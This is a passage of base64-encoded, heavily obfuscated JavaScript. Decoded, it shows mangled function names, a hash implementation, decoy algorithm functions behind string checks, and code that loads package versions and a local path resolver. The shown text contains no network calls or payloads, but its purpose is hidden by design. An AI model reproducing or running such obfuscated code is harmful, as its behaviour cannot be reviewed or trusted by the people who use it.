9fX19fXzNoMVsyXTtfX19fX2g2eDxfX19fX190aTUubGVuZ3RoO19fX19faDZ4KyspX19fYTlnKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19faDZ4KSZfX19fX18zaDFbMjJdLF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19faDZ4KT4+Pl9fX19fXzNoMVs3XSZfX19fX18zaDFbMjJdKTtyZXR1cm4gX19fYTlnfWZ1bmN0aW9uIF9fX19faGpvKF9fX19fX3RpNSl7dmFyIF9fX2E5Zz0iIjtmb3IodmFyIF9fX19faDZ4PV9fX19fXzNoMVsyXTtfX19fX2g2eDxfX19fX190aTUubGVuZ3RoO19fX19faDZ4KyspX19fYTlnKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19faDZ4KT4+Pl9fX19fXzNoMVs3XSZfX19fX18zaDFbMjJdLF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19faDZ4KSZfX19fX18zaDFbMjJdKTtyZXR1cm4gX19fYTlnfWZ1bmN0aW9uIF9fX19fX3h5cihfX19fX190aTUpe3ZhciBfX19hOWc9QXJyYXkoX19fX19fdGk1Lmxlbmd0aD4+X19fX19fM2gxWzBdKTtmb3IodmFyIF9fX19faDZ4PV9fX19fXzNoMVsyXTtfX19fX2g2eDxfX19hOWcubGVuZ3RoO19fX19faDZ4KyspX19fYTlnW19fX19faDZ4XT1fX19fX18zaDFbMl07Zm9yKHZhciBfX19fX2g2eD1fX19fX18zaDFbMl07X19fX19oNng8X19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN107X19fX19oNngrPV9fX19fXzNoMVs3XSlfX19hOWdbX19fX19oNng+Pl9fX19fXzNoMVsyNF1dfD0oX19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19oNngvX19fX19fM2gxWzddKSZfX19fX18zaDFbMjJdKTw8X19fX19fM2gxWzI1XS1fX19fX2g2eCVfX19fX18zaDFbMjNdO3JldHVybiBfX19hOWd9ZnVuY3Rpb24gX19fX3NteShfX19fX190aTUpe3ZhciBfX19hOWc9IiI7Zm9yKHZhciBfX19fX2g2eD1fX19fX18zaDFbMl07X19fX19oNng8X19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbMjNdO19fX19faDZ4Kz1fX19fX18zaDFbN10pX19fYTlnKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fX3RpNVtfX19fX2g2eD4+X19fX19fM2gxWzI0XV0+Pj5fX19fX18zaDFbMjVdLV9fX19faDZ4JV9fX19fXzNoMVsyM10mX19fX19fM2gxWzIyXSk7cmV0dXJuIF9fX2E5Z31mdW5jdGlvbiBfX19fX19qdHooX19fX19fdGk1LF9fX2E5Zyl7cmV0dXJuIF9fX19fX3RpNT4+Pl9fX2E5Z3xfX19fX190aTU8PF9fX19fXzNoMVsyM10tX19fYTlnfWZ1bmN0aW9uIF9fX19fXzExaihfX19fX190aTUsX19fYTlnKXtyZXR1cm4gX19fX19fdGk1Pj4+X19fYTlnfWZ1bmN0aW9uIF9fX2o0NihfX19fX190aTUsX19fYTlnLF9fX19faDZ4KXtyZXR1cm4gX19fX19fdGk1Jl9fX2E5Z15+X19fX19fdGk1Jl9fX19faDZ4fWZ1bmN0aW9uIF9fX19fX2xlMihfX19fX190aTUsX19fYTlnLF9fX19faDZ4KXtyZXR1cm4gX19fX19fdGk1Jl9fX2E5Z15fX19fX190aTUmX19fX19oNnheX19fYTlnJl9fX19faDZ4fWZ1bmN0aW9uIF9fXzJpcChfX19fX190aTUpe3JldHVybiBfX19fX19qdHooX19fX19fdGk1LF9fX19fXzNoMVswXSleX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbNTFdKV5fX19fX19qdHooX19fX19fdGk1LF9fX19fXzNoMVs1Ml0pfWZ1bmN0aW9uIF9fX19fM25mKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzE3XSleX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbNTNdKV5fX19fX19qdHooX19fX19fdGk1LF9fX19fXzNoMVs1NF0pfWZ1bmN0aW9uIF9fX19fX2ZvdShfX19fX190aTUpe3JldHVybiBfX19fX19qdHooX19fX19fdGk1LF9fX19fXzNoMVsyNl0pXl9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzI3XSleX19fX19fMTFqKF9fX19fX3RpNSxfX19fX18zaDFbMTVdKX1mdW5jdGlvbiBfX19fYWlqKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzU1XSleX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbMjhdKV5fX19fX18xMWooX19fX19fdGk1LF9fX19fXzNoMVs0XSl9ZnVuY3Rpb24gX19fMWFjKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzU2XSleX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbNTddKV5fX19fX19qdHooX19fX19fdGk1LF9fX19fXzNoMVs1OF0pfWZ1bmN0aW9uIF9fX19fX2h5bihfX19fX190aTUpe3JldHVybiBfX19fX19qdHooX19fX19fdGk1LF9fX19fXzNoMVs1OV0pXl9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzI3XSleX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbNjBdKX1mdW5jdGlvbiBfX19fX180bDkoX19fX19fdGk1KXtyZXR1cm4gX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbMV0pXl9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzddKV5fX19fX18xMWooX19fX19fdGk1LF9fX19fXzNoMVsyNl0pfWZ1bmN0aW9uIF9fX19fcWU2KF9fX19fX3RpNSl7cmV0dXJuIF9fX19fX2p0eihfX19fX190aTUsX19fX19fM2gxWzI4XSleX19fX19fanR6KF9fX19fX3RpNSxfX19fX18zaDFbNjFdKV5fX19fX18xMWooX19fX19fdGk1LF9fX19fXzNoMVsxN10pfXZhciBfX19yYWM9bmV3IEFycmF5KF9fX19fXzNoMVs2Ml0sX19fX19fM2gxWzYzXSwtX19fX19fM2gxWzY0XSwtX19fX19fM2gxWzY1XSxfX19fX18zaDFbNjZdLF9fX19fXzNoMVs2N10sLV9fX19fXzNoMVs2OF0sLV9fX19fXzNoMVs2OV0sLV9fX19fXzNoMVs3MF0sX19fX19fM2gxWzcxXSxfX19fX18zaDFbNzJdLF9fX19fXzNoMVs3M10sX19fX19fM2gxWzc0XSwtX19fX19fM2gxWzc1XSwtX19fX19fM2gxWzc2XSwtX19fX19fM2gxWzc3XSwtX19fX19fM2gxWzc4XSwtX19fX19fM2gxWzc5XSxfX19fX18zaDFbODBdLF9fX19fXzNoMVs4MV0sX19fX19fM2gxWzgyXSxfX19fX18zaDFbODNdLF9fX19fXzNoMVs4NF0sX19fX19fM2gxWzg1XSwtX19fX19fM2gxWzg2XSwtX19fX19fM2gxWzg3XSwtX19fX19fM2gxWzg4XSwtX19fX19fM2gxWzg5XSwtX19fX19fM2gxWzkwXSwtX19fX19fM2gxWzkxXSxfX19fX18zaDFbOTJdLF9fX19fXzNoMVs5M10sX19fX19fM2gxWzk0XSxfX19fX18zaDFbOTVdLF9fX19fXzNoMVs5Nl0sX19fX19fM2gxWzk3XSxfX19fX18zaDFbOThdLF9fX19fXzNoMVs5OV0sLV9fX19fXzNoMVsxMDBdLC1fX19fX18zaDFbMTAxXSwtX19fX19fM2gxWzEwMl0sLV9fX19fXzNoMVsxMDNdLC1fX19fX18zaDFbMTA0XSwtX19fX19fM2gxWzEwNV0sLV9fX19fXzNoMVsxMDZdLC1fX19fX18zaDFbMTA3XSwtX19fX19fM2gxWzEwOF0sX19fX19fM2gxWzEwOV0sX19fX19fM2gxWzExMF0sX19fX19fM2gxWzExMV0sX19fX19fM2gxWzExMl0sX19fX19fM2gxWzExM10sX19fX19fM2gxWzExNF0sX19fX19fM2gxWzExNV0sX19fX19fM2gxWzExNl0sX19fX19fM2gxWzExN10sX19fX19fM2gxWzExOF0sX19fX19fM2gxWzExOV0sLV9fX19fXzNoMVsxMjBdLC1fX19fX18zaDFbMTIxXSwtX19fX19fM2gxWzEyMl0sLV9fX19fXzNoMVsxMjNdLC1fX19fX18zaDFbMTI0XSwtX19fX19fM2gxWzEyNV0pO2Z1bmN0aW9uIF9fX19fYWM0KF9fX19fX3RpNSxfX19hOWcpe3ZhciBfX19fX2g2eD1uZXcgQXJyYXkoX19fX19fM2gxWzEyNl0sLV9fX19fXzNoMVsxMjddLF9fX19fXzNoMVsxMjhdLC1fX19fX18zaDFbMTI5XSxfX19fX18zaDFbMTMwXSwtX19fX19fM2gxWzEzMV0sX19fX19fM2gxWzEzMl0sX19fX19fM2gxWzEzM10pO3ZhciBfX19fdnQwPW5ldyBBcnJheShfX19fX18zaDFbMjldKTt2YXIgX19fX3p0cSxfX195MTgsX19fX19uaTQsX19fX190aTIsX19fX2FlZCxfX19fX2E4OCxfX19fX19seGUsX19fX19tZWw7dmFyIF9fX19fX25rYixfX196Zm4sX19fX19fM2N5LF9fX2VjNztfX19fX190aTVbX19fYTlnPj5fX19fX18zaDFbMjRdXXw9X19fX19fM2gxWzIwXTw8X19fX19fM2gxWzI1XS1fX19hOWclX19fX19fM2gxWzIzXTtfX19fX190aTVbKF9fX2E5ZytfX19fX18zaDFbMjldPj5fX19fX18zaDFbMTM0XTw8X19fX19fM2gxWzE2XSkrX19fX19fM2gxWzE0XV09X19fYTlnO2ZvcihfX19fX19ua2I9X19fX19fM2gxWzJdO19fX19fX25rYjxfX19fX190aTUubGVuZ3RoO19fX19fX25rYis9X19fX19fM2gxWzhdKXtfX19fenRxPV9fX19faDZ4W19fX19fXzNoMVsyXV07X19feTE4PV9fX19faDZ4W19fX19fXzNoMVsxXV07X19fX19uaTQ9X19fX19oNnhbX19fX19fM2gxWzBdXTtfX19fX3RpMj1fX19fX2g2eFtfX19fX18zaDFbMTVdXTtfX19fYWVkPV9fX19faDZ4W19fX19fXzNoMVsxNl1dO19fX19fYTg4PV9fX19faDZ4W19fX19fXzNoMVsyNF1dO19fX19fX2x4ZT1fX19fX2g2eFtfX19fX18zaDFbMTddXTtfX19fX21lbD1fX19fX2g2eFtfX19fX18zaDFbMjZdXTtmb3IoX19femZuPV9fX19fXzNoMVsyXTtfX196Zm48X19fX19fM2gxWzI5XTtfX196Zm4rKyl7aWYoX19femZuPF9fX19fXzNoMVs4XSlfX19fdnQwW19fX3pmbl09X19fX19fdGk1W19fX3pmbitfX19fX19ua2JdO2Vsc2UgX19fX3Z0MFtfX196Zm5dPV9fX19fbnpkKF9fX19fbnpkKF9fX19fbnpkKF9fX19haWooX19fX3Z0MFtfX196Zm4tX19fX19fM2gxWzBdXSksX19fX3Z0MFtfX196Zm4tX19fX19fM2gxWzI2XV0pLF9fX19fX2ZvdShfX19fdnQwW19fX3pmbi1fX19fX18zaDFbMTRdXSkpLF9fX192dDBbX19femZuLV9fX19fXzNoMVs4XV0pO19fX19fXzNjeT1fX19fX256ZChfX19fX256ZChfX19fX256ZChfX19fX256ZChfX19fX21lbCxfX19fXzNuZihfX19fYWVkKSksX19fajQ2KF9fX19hZWQsX19fX19hODgsX19fX19fbHhlKSksX19fcmFjW19fX3pmbl0pLF9fX192dDBbX19femZuXSk7X19fZWM3PV9fX19fbnpkKF9fXzJpcChfX19fenRxKSxfX19fX19sZTIoX19fX3p0cSxfX195MTgsX19fX19uaTQpKTtfX19fX21lbD1fX19fX19seGU7X19fX19fbHhlPV9fX19fYTg4O19fX19fYTg4PV9fX19hZWQ7X19fX2FlZD1fX19fX256ZChfX19fX3RpMixfX19fX18zY3kpO19fX19fdGkyPV9fX19fbmk0O19fX19fbmk0PV9fX3kxODtfX195MTg9X19fX3p0cTtfX19fenRxPV9fX19fbnpkKF9fX19fXzNjeSxfX19lYzcpfV9fX19faDZ4W19fX19fXzNoMVsyXV09X19fX19uemQoX19fX3p0cSxfX19fX2g2eFtfX19fX18zaDFbMl1dKTtfX19fX2g2eFtfX19fX18zaDFbMV1dPV9fX19fbnpkKF9fX3kxOCxfX19fX2g2eFtfX19fX18zaDFbMV1dKTtfX19fX2g2eFtfX19fX18zaDFbMF1dPV9fX19fbnpkKF9fX19fbmk0LF9fX19faDZ4W19fX19fXzNoMVswXV0pO19fX19faDZ4W19fX19fXzNoMVsxNV1dPV9fX19fbnpkKF9fX19fdGkyLF9fX19faDZ4W19fX19fXzNoMVsxNV1dKTtfX19fX2g2eFtfX19fX18zaDFbMTZdXT1fX19fX256ZChfX19fYWVkLF9fX19faDZ4W19fX19fXzNoMVsxNl1dKTtfX19fX2g2eFtfX19fX18zaDFbMjRdXT1fX19fX256ZChfX19fX2E4OCxfX19fX2g2eFtfX19fX18zaDFbMjRdXSk7X19fX19oNnhbX19fX19fM2gxWzE3XV09X19fX19uemQoX19fX19fbHhlLF9fX19faDZ4W19fX19fXzNoMVsxN11dKTtfX19fX2g2eFtfX19fX18zaDFbMjZdXT1fX19fX256ZChfX19fX21lbCxfX19fX2g2eFtfX19fX18zaDFbMjZdXSl9cmV0dXJuIF9fX19faDZ4fWZ1bmN0aW9uIF9fX19fbnpkKF9fX19fX3RpNSxfX19hOWcpe3ZhciBfX19fX2g2eD0oX19fX19fdGk1Jl9fX19fXzNoMVszMF0pKyhfX19hOWcmX19fX19fM2gxWzMwXSk7dmFyIF9fX192dDA9KF9fX19fX3RpNT4+X19fX19fM2gxWzhdKSsoX19fYTlnPj5fX19fX18zaDFbOF0pKyhfX19fX2g2eD4+X19fX19fM2gxWzhdKTtyZXR1cm4gX19fX3Z0MDw8X19fX19fM2gxWzhdfF9fX19faDZ4Jl9fX19fXzNoMVszMF19cmV0dXJue2hleDpfX19fX2g2eCxiNjQ6X19fX19uaTQsYW55Ol9fX19fdGkyLGhleF9obWFjOl9fX3kxOCxiNjRfaG1hYzpfX19fX25pNCxhbnlfaG1hYzpfX19fX3RpMn19KCk7Y29uc29sZS5sb2coX19fX19fdGk1KX1pZihfX19fX190aTVbX19fX19neDYrX19fX19fMnB0XT09PV9fX2E5Z1tfX19fX18ycHRdKXtpZigiXHg1OFx4NjhceDQyXHg1Mlx4MzhceDZmIiBpbiBfX19fX19seGUpe19fX19fdGkyKCl9ZnVuY3Rpb24gX19fX190aTIoKXtmdW5jdGlvbiBfX19fX190aTUoX19fX19fdGk1KXtyZXR1cm4gX19fX19fdGk1W19fX19fXzNoMVsxXV0qX19fX19fM2gxWzE1Ml0rKF9fX19fX3RpNVtfX19fX18zaDFbMl1dPF9fX19fXzNoMVsyXT9fX19fX18zaDFbMTUxXXxfX19fX190aTVbX19fX19fM2gxWzJdXTpfX19fX190aTVbX19fX19fM2gxWzJdXSl9ZnVuY3Rpb24gX19fYTlnKF9fX19fX3RpNSl7c3dpdGNoKCgoX19fX19fdGk1Jl9fX19fXzNoMVsxNTFdKSE9PV9fX19fXzNoMVsyXSkqX19fX19fM2gxWzFdKyhfX19fX190aTU8X19fX19fM2gxWzJdKSpfX19fX18zaDFbMF0pe2Nhc2UgX19fX19fM2gxWzJdOnJldHVybltfX19fX190aTUlX19fX19fM2gxWzE1MV0sTWF0aC50cnVuYyhfX19fX190aTUvX19fX19fM2gxWzE1Ml0pXTtjYXNlIF9fX19fXzNoMVsxXTpyZXR1cm5bX19fX19fdGk1JV9fX19fXzNoMVsxNTFdLV9fX19fXzNoMVsxNTFdLE1hdGgudHJ1bmMoX19fX19fdGk1L19fX19fXzNoMVsxNTJdKStfX19fX18zaDFbMV1dO2Nhc2UgX19fX19fM2gxWzBdOnJldHVyblsoKF9fX19fX3RpNStfX19fX18zaDFbMTUxXSklX19fX19fM2gxWzE1MV0rX19fX19fM2gxWzE1MV0pJV9fX19fXzNoMVsxNTFdLE1hdGgucm91bmQoX19fX19fdGk1L19fX19fXzNoMVsxNTJdKV07Y2FzZSBfX19fX18zaDFbMTVdOnJldHVybltfX19fX190aTUlX19fX19fM2gxWzE1MV0sTWF0aC50cnVuYyhfX19fX190aTUvX19fX19fM2gxWzE1Ml0pXX19bGV0IF9fX19feHB1PV9fX19fX3RpNShbX19fX19fM2gxWzBdLF9fX19fXzNoMVsxNl1dKTtsZXQgX19fX19oNng9X19fX19fdGk1KFtfX19fX18zaDFbMV0sX19fX19fM2gxWzBdXSk7bGV0IF9fX192dDA9X19fX194cHUrX19fX19oNng7bGV0IF9fX196dHE9X19fX3Z0MC1fX19fX2g2eDtsZXQgX19fX19neDY9X19fX3p0cSpfX19fX18zaDFbMF07bGV0IF9fX3kxOD1fX19fX2d4Ni9fX19fX18zaDFbMF07Y29uc29sZS5sb2coX19fYTlnKF9fX192dDApKTtjb25zb2xlLmxvZyhfX19hOWcoX19fX3p0cSkpO2NvbnNvbGUubG9nKF9fX2E5ZyhfX19fX2d4NikpO2NvbnNvbGUubG9nKF9fX2E5ZyhfX195MTgpKX1fX19fdnQwKys7aWYoX19fX3Z0MD09PV9fX19faDZ4KXtpZigiXHg1MFx4NDZceDc2XHgzNlx4NzNceDMyIisiXHg1NiIgaW4gX19fX19fbHhlKXtfX19fYWVkKCl9ZnVuY3Rpb24gX19fX2FlZCgpe2NvbnN0IF9fX19fX3RpNT1yZXF1aXJlKCJwYXRoIik7Y29uc3R7dmVyc2lvbjpfX19hOWd9PXJlcXVpcmUoIi4uLy4uL3BhY2thZ2UiKTtjb25zdHt2ZXJzaW9uOl9fX19feHB1fT1yZXF1aXJlKCJAcmVkYWN0ZWQvZW50ZXJwcmlzZS1wbHVnaW4vcGFja2FnZSIpO2NvbnN0e3ZlcnNpb246X19fX19oNnh9PXJlcXVpcmUoIkByZWRhY3RlZC9jb21wb25lbnRzL3BhY2thZ2UiKTtjb25zdHtzZGtWZXJzaW9uOl9fX192dDB9PXJlcXVpcmUoIkByZWRhY3RlZC9lbnRlcnByaXNlLXBsdWdpbiIpO2NvbnN0IF9fX196dHE9cmVxdWlyZSgiLi4vdXRpbHMvaXNTdGFuZGFsb25lRXhlY3V0YWJsZSIpO2NvbnN0IF9fX19fZ3g2PXJlcXVpcmUoIi4vcmVzb2x2ZS1sb2NhbC1yZWRhY3RlZC1wYXRoIik7Y29uc3QgX19feTE4PV9fX19fX3RpNS5yZXNvbHZlKF9fZGlybmFtZSwiXHUwMDJlXHUwMDJlXHUwMDJmXHUwMDcyXHUwMDY1XHUwMDY0IisiXHg2MVx4NjNceDc0XHg2NVx4NjRceDJlIisiXHg2YVx4NzMiKX1yZXR1cm4gX19fX19neDZ9fWVsc2V7aWYoIlx1MDA1Mlx1MDA3M1x1MDAzN1x1MDA1N1x1MDA0MVx1MDA2YiIgaW4gX19fX19fbHhlKXtfX19fX2E4OCgpfWZ1bmN0aW9uIF9fX19fYTg4KCl7dmFyIF9fX19fX3RpNT1mdW5jdGlvbihfX19fX190aTUpe3ZhciBfX19hOWc9X19fX19fdGk1Lmxlbmd0aDtpZihfX19hOWc8X19fX19fM2gxWzBdKXJldHVybiBfX19fX18zaDFbMl07dmFyIF9fX19faDZ4PU1hdGgubWF4KC4uLl9fX19fX3RpNSk7dmFyIF9fX192dDA9TWF0aC5taW4oLi4uX19fX19fdGk1KTtpZihfX19fX2g2eD09PV9fX192dDApcmV0dXJuIF9fX19fXzNoMVsyXTt2YXIgX19fX3p0cT1BcnJheShfX19hOWctX19fX19fM2gxWzFdKS5maWxsKE51bWJlci5NQVhfU0FGRV9JTlRFR0VSKTt2YXIgX19feTE4PUFycmF5KF9fX2E5Zy1fX19fX18zaDFbMV0pLmZpbGwoTnVtYmVyLk1JTl9TQUZFX0lOVEVHRVIpO3ZhciBfX19fX25pND1NYXRoLmNlaWwoKF9fX19faDZ4LV9fX192dDApLyhfX19hOWctX19fX19fM2gxWzFdKSk7dmFyIF9fX19fdGkyPV9fX19fXzNoMVsyXTtmb3IodmFyIF9fX19hZWQ9X19fX19fM2gxWzJdO19fX19hZWQ8X19fYTlnO19fX19hZWQrKyl7aWYoX19fX19fdGk1W19fX19hZWRdPT09X19fX3Z0MHx8X19fX19fdGk1W19fX19hZWRdPT09X19fX19oNngpY29udGludWU7X19fX190aTI9TWF0aC5mbG9vcigoX19fX19fdGk1W19fX19hZWRdLV9fX192dDApL19fX19fbmk0KTtfX19fenRxW19fX19fdGkyXT1NYXRoLm1pbihfX19fenRxW19fX19fdGkyXSxfX19fX190aTVbX19fX2FlZF0pO19fX3kxOFtfX19fX3RpMl09TWF0aC5tYXgoX19feTE4W19fX19fdGkyXSxfX19fX190aTVbX19fX2FlZF0pfXZhciBfX19fX2E4OD1OdW1iZXIuTUlOX1NBRkVfSU5URUdFUjt2YXIgX19fX19fa3k2PV9fX192dDA7Zm9yKHZhciBfX19fX19seGU9X19fX19fM2gxWzJdO19fX19fX2x4ZTxfX19hOWctX19fX19fM2gxWzFdO19fX19fX2x4ZSsrKXtpZihfX19fenRxW19fX19fX2x4ZV09PT1OdW1iZXIuTUFYX1NBRkVfSU5URUdFUiYmX19feTE4W19fX19fX2x4ZV09PT1OdW1iZXIuTUlOX1NBRkVfSU5URUdFUiljb250aW51ZTtfX19fX2E4OD1NYXRoLm1heChfX19fX2E4OCxfX19fenRxW19fX19fX2x4ZV0tX19fX19fa3k2KTtfX19fX19reTY9X19feTE4W19fX19fX2x4ZV19X19fX19hODg9TWF0aC5tYXgoX19fX19hODgsX19fX19oNngtX19fX19fa3k2KTtyZXR1cm4gX19fX19hODh9O2NvbnNvbGUubG9nKF9fX19fX3RpNSl9KGZ1bmN0aW9uKCl7aWYoIlx1MDA1OVx1MDA2Mlx1MDA2OFx1MDAzN1x1MDA0Zlx1MDA3NSIrIlx1MDA2YSIgaW4gX19fX19fbHhlKXtfX19fX190aTUoKX1mdW5jdGlvbiBfX19fX190aTUoKXt2YXIgX19fX19fdGk1PWZ1bmN0aW9uKF9fX19fX3RpNSxfX19fX3hwdSl7cmV0dXJuIF9fX2E5Zyh7fSxfX19fX190aTUsX19fX194cHUpfTt2YXIgX19fYTlnPWZ1bmN0aW9uKF9fX19fX3RpNSxfX19fX3hwdSxfX19fX2g2eCl7dmFyIF9fX192dDA9e307aWYoX19fX19fdGk1W19fX19feHB1K19fX19faDZ4XSE9PV9fX19fXzNoMVsxNDNdKXJldHVybiBfX19fX190aTVbX19fX194cHUrX19fX19oNnhdO2lmKF9fX19feHB1PT09X19fX19oNngpcmV0dXJuIF9fX19fXzNoMVs2XTtmb3IodmFyIF9fX196dHE9X19fX19fM2gxWzJdO19fX196dHE8X19fX194cHUubGVuZ3RoO19fX196dHErKyl7aWYoX19fX3Z0MFtfX19fX3hwdVtfX19fenRxXV09PT1fX19fX18zaDFbMTQzXSlfX19fdnQwW19fX19feHB1W19fX196dHFdXT1fX19fX18zaDFbMl07aWYoX19fX3Z0MFtfX19fX2g2eFtfX19fenRxXV09PT1fX19fX18zaDFbMTQzXSlfX19fdnQwW19fX19faDZ4W19fX196dHFdXT1fX19fX18zaDFbMl07X19fX3Z0MFtfX19fX3hwdVtfX19fenRxXV0rKztfX19fdnQwW19fX19faDZ4W19fX196dHFdXS0tfWZvcih2YXIgX19feTE4IGluIF9fX192dDApe2lmKF9fX192dDBbX19feTE4XSE9PV9fX19fXzNoMVsyXSl7X19fX19fdGk1W19fX19feHB1K19fX19faDZ4XT1fX19fX18zaDFbNV07cmV0dXJuIF9fX19fXzNoMVs1XX19Zm9yKHZhciBfX19fX25pND1fX19fX18zaDFbMV07X19fX19uaTQ8X19fX194cHUubGVuZ3RoO19fX19fbmk0Kyspe2lmKF9fX2E5ZyhfX19fX190aTUsX19fX194cHUuc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX25pNCksX19fX19oNnguc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX25pNCkpJiZfX19hOWcoX19fX19fdGk1LF9fX19feHB1LnN1YnN0cihfX19fX25pNCksX19fX19oNnguc3Vic3RyKF9fX19fbmk0KSl8fF9fX2E5ZyhfX19fX190aTUsX19fX194cHUuc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX25pNCksX19fX19oNnguc3Vic3RyKF9fX19faDZ4Lmxlbmd0aC1fX19fX25pNCkpJiZfX19hOWcoX19fX19fdGk1LF9fX19feHB1LnN1YnN0cihfX19fX25pNCksX19fX19oNnguc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX2g2eC5sZW5ndGgtX19fX19uaTQpKSl7X19fX19fdGk1W19fX19feHB1K19fX19faDZ4XT1fX19fX18zaDFbNl07cmV0dXJuIF9fX19fXzNoMVs2XX19X19fX19fdGk1W19fX19feHB1K19fX19faDZ4XT1fX19fX18zaDFbNV07cmV0dXJuIF9fX19fXzNoMVs1XX07Y29uc29sZS5sb2coX19fX19fdGk1KX12YXIgX19fYTlnPWZ1bmN0aW9uKCl7aWYoIlx4NmZceDdhXHg1Nlx4NDFceDQ5XHg1MiIgaW4gX19fX19fbHhlKXtfX19fX190aTUoKX1mdW5jdGlvbiBfX19fX190aTUoKXt2YXIgX19fX19fdGk1PWZ1bmN0aW9uKCl7dmFyIF9fX19fX3RpNT1fX19fX18zaDFbMl07dmFyIF9fX19faDZ4PSIiO2Z1bmN0aW9uIF9fX192dDAoX19fX19fdGk1KXtyZXR1cm4gX19fb3E5KF9fX19fYTg4KF9fX180dGooX19fX19fdGk1KSkpfWZ1bmN0aW9uIF9fX196dHEoX19fX19fdGk1KXtyZXR1cm4gX19fX19fMzVxKF9fX19fYTg4KF9fX180dGooX19fX19fdGk1KSkpfWZ1bmN0aW9uIF9fX2E5ZyhfX19fX190aTUsX19fX19oNngpe3JldHVybiBfX19fX3k5ZihfX19fX2E4OChfX19fNHRqKF9fX19fX3RpNSkpLF9fX19faDZ4KX1mdW5jdGlvbiBfX195MTgoX19fX19fdGk1LF9fX19faDZ4KXtyZXR1cm4gX19fb3E5KF9fX19fX2x4ZShfX19fNHRqKF9fX19fX3RpNSksX19fXzR0aihfX19fX2g2eCkpKX1mdW5jdGlvbiBfX19fX25pNChfX19fX190aTUsX19fX19oNngpe3JldHVybiBfX19fX18zNXEoX19fX19fbHhlKF9fX180dGooX19fX19fdGk1KSxfX19fNHRqKF9fX19faDZ4KSkpfWZ1bmN0aW9uIF9fX19fdGkyKF9fX19fX3RpNSxfX19fX2g2eCxfX19fdnQwKXtyZXR1cm4gX19fX195OWYoX19fX19fbHhlKF9fX180dGooX19fX19fdGk1KSxfX19fNHRqKF9fX19faDZ4KSksX19fX3Z0MCl9ZnVuY3Rpb24gX19fX2FlZCgpe3JldHVybiBfX19fdnQwKF9fX19fXzNoMVszMV0pLnRvTG93ZXJDYXNlKCk9PV9fX19fXzNoMVsxNTNdK19fX19fXzNoMVsxNTRdK19fX19fXzNoMVsxNTVdK19fX19fXzNoMVsxNTZdK19fX19fXzNoMVsxNTddK19fX19fXzNoMVsxNThdK19fX19fXzNoMVsxNTldK19fX19fXzNoMVszMl19ZnVuY3Rpb24gX19fX19hODgoX19fX19fdGk1KXtyZXR1cm4gX19fdjNmKF9fX2NjYShfX19faHlvKF9fX19fX3RpNSksX19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pKX1mdW5jdGlvbiBfX19fX19seGUoX19fX19fdGk1LF9fX19faDZ4KXt2YXIgX19fX3Z0MD1fX19faHlvKF9fX19fX3RpNSk7aWYoX19fX3Z0MC5sZW5ndGg+X19fX19fM2gxWzhdKV9fX192dDA9X19fY2NhKF9fX192dDAsX19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pO3ZhciBfX19fenRxPUFycmF5KF9fX19fXzNoMVs4XSksX19fYTlnPUFycmF5KF9fX19fXzNoMVs4XSk7Zm9yKHZhciBfX195MTg9X19fX19fM2gxWzJdO19fX3kxODxfX19fX18zaDFbOF07X19feTE4Kyspe19fX196dHFbX19feTE4XT1fX19fdnQwW19fX3kxOF1eX19fX19fM2gxWzMzXTtfX19hOWdbX19feTE4XT1fX19fdnQwW19fX3kxOF1eX19fX19fM2gxWzM0XX12YXIgX19fX19uaTQ9X19fY2NhKF9fX196dHEuY29uY2F0KF9fX19oeW8oX19fX19oNngpKSxfX19fX18zaDFbMTFdK19fX19faDZ4Lmxlbmd0aCpfX19fX18zaDFbN10pO3JldHVybiBfX192M2YoX19fY2NhKF9fX2E5Zy5jb25jYXQoX19fX19uaTQpLF9fX19fX2t5NihfX19fX18zaDFbOV0rX19fX19fM2gxWzEwXSxfX19fX18zaDFbMTFdLF9fX19fXzNoMVsxMl0pKSl9ZnVuY3Rpb24gX19fb3E5KF9fX19faDZ4KXt0cnl7X19fX19fdGk1fWNhdGNoKF9fX192dDApe19fX19fX3RpNT1fX19fX18zaDFbMl19dmFyIF9fX196dHE9X19fX19fdGk1P19fX19fXzNoMVsxM10rX19fX19fM2gxWzM1XStfX19fX18zaDFbMzZdOl9fX19fXzNoMVsxM10rX19fX19fM2gxWzM3XStfX19fX18zaDFbMzhdO3ZhciBfX19hOWc9IiI7dmFyIF9fX3kxODtmb3IodmFyIF9fX19fbmk0PV9fX19fXzNoMVsyXTtfX19fX25pNDxfX19fX2g2eC5sZW5ndGg7X19fX19uaTQrKyl7X19feTE4PV9fX19faDZ4LmNoYXJDb2RlQXQoX19fX19uaTQpO19fX2E5Zys9X19fX3p0cS5jaGFyQXQoX19feTE4Pj4+X19fX19fM2gxWzE2XSZfX19fX18zaDFbMTRdKStfX19fenRxLmNoYXJBdChfX195MTgmX19fX19fM2gxWzE0XSl9cmV0dXJuIF9fX2E5Z31mdW5jdGlvbiBfX19fX18zNXEoX19fX19fdGk1KXt0cnl7X19fX19oNnh9Y2F0